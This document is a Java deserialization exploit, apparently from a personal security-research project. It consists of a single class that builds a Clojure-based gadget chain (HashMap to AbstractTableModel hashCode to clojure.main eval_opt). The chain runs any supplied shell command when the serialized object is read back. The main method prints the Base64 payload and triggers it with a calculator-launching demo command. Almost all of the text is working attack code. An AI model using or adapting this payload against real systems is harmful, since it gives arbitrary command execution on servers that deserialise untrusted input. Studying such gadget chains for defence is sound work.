# Payload
```java
/*
	Gadget chain:	
		ObjectInputStream.readObject()
			HashMap.readObject()
				AbstractTableModel$ff19274a.hashCode()
					clojure.core$comp$fn__4727.invoke()
						clojure.core$constantly$fn__4614.invoke()
						clojure.main$eval_opt.invoke()

 * @author fe1w0
 * @date 2025/2/4 02:23
 * @Project OwnJavaSec
 */
public class ClojurePayload {
    public Map<?, ?> getObject(final String command) throws Exception {

        final String[] execArgs = command.split(" ");
        final StringBuilder commandArgs = new StringBuilder();
        for (String arg : execArgs) {
            commandArgs.append("\" \"");
            commandArgs.append(arg);
        }
        commandArgs.append("\"");

        final String clojurePayload =
                String.format("(use '[clojure.java.shell :only [sh]]) (sh %s)", commandArgs.substring(2));

        Map<String, Object> fnMap = new HashMap<String, Object>();
        fnMap.put("hashCode", new clojure.core$constantly().invoke(0));

        AbstractTableModel$ff19274a model = new AbstractTableModel$ff19274a();
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        HashMap<Object, Object> targetMap = new HashMap<Object, Object>();
        targetMap.put(model, null);

        fnMap.put("hashCode",
                new clojure.core$comp().invoke(
                        new clojure.main$eval_opt(),
                        new clojure.core$constantly().invoke(clojurePayload)));
        model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));

        return targetMap;
    }

    public static void main(final String[] args) throws Exception {
        Map map = new ClojurePayload().getObject("open -a Calculator");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(map);
        System.out.println(new String(Base64.encodeBase64(baos.toByteArray())));
        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Map unSerMap = (Map) ois.readObject();
    }
}
```